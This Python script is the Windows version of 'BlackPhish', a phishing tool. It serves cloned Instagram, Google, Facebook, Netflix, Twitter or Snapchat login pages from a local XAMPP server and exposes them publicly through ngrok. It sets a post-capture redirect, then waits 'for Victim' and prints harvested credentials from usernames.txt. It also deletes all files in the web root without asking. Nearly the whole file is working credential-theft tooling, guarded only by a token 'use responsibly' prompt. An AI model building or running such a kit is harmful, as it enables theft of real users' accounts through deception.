####################################################
#       Version supporting windows systems         #
#                   V1.0-                          #
#              Commit by Nano                      #
####################################################


# Libraries #
import os, glob, ctypes
from os import system, getcwd, remove
from time import sleep
from socket import create_connection, gethostname, gethostbyname
from distutils import dir_util
from sys import version_info, platform

# Variables #
cwd = getcwd() # Gets working directory #

localip = gethostbyname(gethostname()) # Get local IP #


# Checks if user is on windows
if platform == "win32":
    pass
else:
    print("Hey looks like u are not on windows, or we couldn't detect the device. Exiting...")
    exit(0)


# COLORS #
red = "\033[91;1m"
reset = "\033[0m"
green = "\033[92;1m"
cyan = "\033[96;1m"
yellow = "\033[93;1m"
magenta = "\033[95;1m"
blue = "\033[94;1m"
white = "\033[97;1m"
blink = "\033[5m"


def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

if isAdmin():
    pass
else:
    print("Please run cmd as admin")
    exit(0)

# Check for python version #
if version_info < (3,0,0):
    exit(red + "[!] Please use python3: install from windows store" + reset)

# Why are we not using the colors we just defined? LOL

def warning():  # Banner #
    print('''
\033[94;1m
                https://github.com/iinc0gnit0/BlackPhish\033[0m\033[91m


        ▀█████████▄                      ▀████████▄
          ███    ███                       ███    ███  
          ███    ███                       ███    ███ 
          ███▄▄▄██▀                        ███    ███ 
          ███▀▀▀██▄                        ████████▀ 
          ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
          ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v3.4


                    Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m

                    Script created by: \033[91;1m[ inc0gnit0 ] [ retro0001 ]\033[94;1m

	            Revisions made by: \033[91;1m[ jackoftimeandreality ]\033[94;1m

                    Websites created by: \033[91;1m[ TableFlipGod ]\033[94;1m 

                    Big Thanks to: \033[91;1m [ DarkSecDevelopers ]\033[93;1m ''')
    print('\n')
    warningchoice = input(
        "                    Will you use this responsibly (\033[94;1my\033[93;1m/\033[91mn\033[93;1m): ")  # Agreement Message #

    if warningchoice == 'y':
        pass
    elif warningchoice == 'yes':
        pass
    elif warningchoice == 'Y':
        pass
    elif warningchoice == 'Yes':
        pass
    else:
        endMessage()


# Banner #
def banner():

    print('''
\033[94;1m
                https://github.com/iinc0gnit0/BlackPhish\033[0m\033[91m
                \033[94;1m run xampp-windows-installer.exe\033[0m\033[91m


        ▀█████████▄                      ▀████████▄
          ███    ███                       ███    ███  
          ███    ███                       ███    ███ 
          ███▄▄▄██▀                        ███    ███ 
          ███▀▀▀██▄                        ████████▀ 
          ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
          ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v4.0


                    Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m

                    Script created by: \033[91;1m[ inc0gnit0 ] [ retro0001 ]\033[94;1m

		    Revisions made by: \033[91;1m[ jackoftimeandreality ]\033[94;1m

                    Websites created by: \033[91;1m[ TableFlipGod ]\033[94;1m 

                    Big Thanks to: \033[91;1m [ DarkSecDevelopers ]\033[91;1m
                    



        [1]\033[94;1m Instagram \033[91;1m
        [2]\033[94;1m Google \033[91;1m
        [3]\033[94;1m Facebook \033[91;1m
        [4]\033[94;1m Netflix \033[91;1m
        [5]\033[94;1m Twitter \033[91;1m
        [6]\033[94;1m Snapchat \033[91;1m
        [0]\033[94;1m Clean \033[91;1m
        [x]\033[94;1m Exit


        \033[0m''')




def setup(template):  # Template for input #

    print('\n')
    print(red + '           [1]' + blue + ' ngrok (More Options for windows Soon!)\n\n')
    print(red + '           [2]' + blue + ' localhost \n')
    choice1 = input(red + "        [" + blue + f"BlackPhish-{template}" + red + "] -> ")


    # delete all files in htdocs
    try:

        dir = 'C:\\xampp\\htdocs\\'
        filelist = glob.glob(os.path.join(dir, "*"))
        for f in filelist:
            os.remove(f)
    except:
        pass

    # Setup #
    if choice1 == '1':
        system("cls")
        #system('del /f C:\\xampp\\htdocs\\*')

        print(green + f'[+] Copying Files from {template}')
        sleep(0.1)
        dir_util.copy_tree(f"Websites/{template}",
                           "C:\\xampp\\htdocs\\")  # Copies the entire folder of Websites/template to htdocs for xampp#
        redirect()  # Redirect Prompt #
        print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
        dir_util.copy_tree("Server/www", "C:\\xampp\\htdocs\\")  # Copies from Server/www to C:\\xampp\\htdocs\\ #

        print(green + '[+] Copying to C:\\xampp\\htdocs\\')
        sleep(0.1)
        print(yellow + '[+] Starting Apache2 Service')
        sleep(0.1)
        system(f'{cwd}\\Windows\\apachestart.bat')  # Starts apache service #
        print(green + '[+] Apache2 Service Started')
        sleep(0.1)
        print(blue + "\nLocal: " + red + localip + "\n")  # Shows where site is hosted locally #
        sleep(0.1)
        print(yellow + '[*] Starting ngrok')
        #system('taskkill /IM "ngrok.exe" /F')
        ngrokForward()  # ngrok port forward #
        print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
        sleep(0.1)
        while True:  # Waits for content on usernames.txt #
            with open('C:\\xampp\\htdocs\\usernames.txt') as creds:
                lines = creds.read().rstrip()
                if len(lines) != 0:
                    sleep(1)
                    print(green + "______________________________________________________________________________\n")
                    print('\n                CREDENTIALS FOUND\n\n')
                    system("type C:\\xampp\\htdocs\\usernames.txt")
                    print("\n______________________________________________________________________________" + reset)
                    endMessage()
    if choice1 == '2':
        system("cls")
        # system('del /f C:\\xampp\\htdocs\\*')

        print(green + f'[+] Copying Files from {template} template')
        sleep(0.1)
        dir_util.copy_tree(f"Websites/{template}",
                           "C:\\xampp\\htdocs\\")  # Copies the entire folder of Websites/template to htdocs for xampp#
        redirect()  # Redirect Prompt #
        print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
        dir_util.copy_tree("Server/www", "C:\\xampp\\htdocs\\")  # Copies from Server/www to C:\\xampp\\htdocs\\ #

        print(green + '[+] Copying to C:\\xampp\\htdocs\\')
        sleep(0.1)
        print(yellow + '[+] Starting Apache2 Service')
        sleep(0.1)
        system(f'{cwd}\\Windows\\apachestart.bat')  # Starts apache service #
        print(green + '[+] Apache2 Service Started')
        print(green + f"[+] {template} template is currently running!")
        sleep(0.1)
        sleep(4)
        system('cls')

        print(green + "[+] Localhost: " + red + localip + "\n")  # Shows where site is hosted locally #
        sleep(0.1)
        print(yellow + "[+] Waiting For Victim ... \n")
        sleep(0.1)
        while True:  # Waits for content on usernames.txt #
            with open('C:\\xampp\\htdocs\\usernames.txt') as creds:
                lines = creds.read().rstrip()

                if len(lines) != 0:
                    sleep(5)
                    system('cls')
                    print(blue + "\nLocalhost: " + red + localip + "\n")
                    print(green + "______________________________________________________________________________\n")
                    print('\n                   CREDENTIALS FOUND\n\n')
                    system("type C:\\xampp\\htdocs\\usernames.txt")
                    print("\n______________________________________________________________________________" + reset)
                    print(yellow + "\n  [Control + C] to stop\n")
                    #endMessage()

    else:
        print(red + '[!] Invalid Option')
        sleep(1)
        main()


# Port forward to ngrok #
def ngrokForward():
    sleep(2)
    try:
        system(f"cd {cwd}\\Windows && ngrok.exe http 80")
    except:
        print(red + "\n[!] Something went wrong! Please try again")
        endMessage()


#


# Redirect Prompt #

def redirect():
    redirect = input(yellow + "URL redirect to: ")

    if redirect == "":
        print(red+"[!] redirect as been set to none!")
        pass


    if 'http://' in redirect or 'https://' in redirect:
        with open('C:\\xampp\\htdocs\\login.php') as f:
            read = f.read()
        r = read.replace('<REDIRECT>', redirect)
        w = open('C:\\xampp\\htdocs\\login.php', 'w')
        w.write(r)
        w.close()

    else:
        redirect = 'https://' + redirect
        with open('C:\\xampp\\htdocs\\login.php') as f:
            read = f.read()
        r = read.replace('<REDIRECT>', redirect)
        w = open('C:\\xampp\\htdocs\\login.php', 'w')
        w.write(r)
        w.close()




def endMessage(): # Message when you exit #
    print("\n")
    print(yellow + "  Thank you using " + red + "BlackPhish for windows\n")
    print(yellow + "  If you have any problems while using " + red + "BlackPhish " + yellow + "please report it to us\n")
    print(yellow + "  Make Pull Request to support this tool\n")
    print("\n" + reset)
    exit(0)

def checkInternet(): # Checks for internet connection #
    print(yellow + "[*] Checking connection...")
    try:
        create_connection(("www.github.com", 80)) # Tries to connect to github.com #
        print(green + "[+] Internet Found")
        sleep(2)
    except OSError: # Checks for OSError #
        print(red + "[!] Internet Not Found" + reset)
        exit(0)

def main():
    system("cls")  # clear screen #

    checkInternet()  # Check internet connection #

    system("cls")  # clear screen #

    warning()  # Agree to use with responsibily #

    system('cls')  # clear screen #

    banner()  # Load Banner #

    choice = input(red + "        [" + blue + "BlackPhish" + red + "] -> ")  # Get user input #

    # Instagram #
    if choice == "1":
        setup("Instagram")

    # Google #
    elif choice == '2':
        setup("Google")

    # Facebook #
    elif choice == '3':
        setup("Facebook")

    # Netflix #
    elif choice == '4':
        setup("Netflix")

    # Twitter #
    elif choice == "5":
        setup("Twitter")

    # Snapchat #
    elif choice == "6":
        setup("Snapchat")



# Clean out everything #
    elif choice == "0":
        print(green + "[+] Killed xampp ")
        try:
            system('taskkill /IM "xampp-control.exe" /F')

            print(green + "[+] Stopping Apache2")

            system('taskkill /IM "httpd.exe" /F')
        except:
            print(red + "[!] could not kill xampp is it running?")
            main()

        print(blue + '[+] Done')




    # Exit #
    elif choice == 'x':
        endMessage()



    # Invalid Option Error #
    else:
        print(red + "[!] Invalid option" + reset)
        main()



try:
    if __name__ == '__main__':
        main()

# Will detect if they exit #
except KeyboardInterrupt:
    print("\n")
    print(red + "[!] KeyboardInterrupt Detected")
    print(red + "[!] Exiting" + reset)
    exit(0)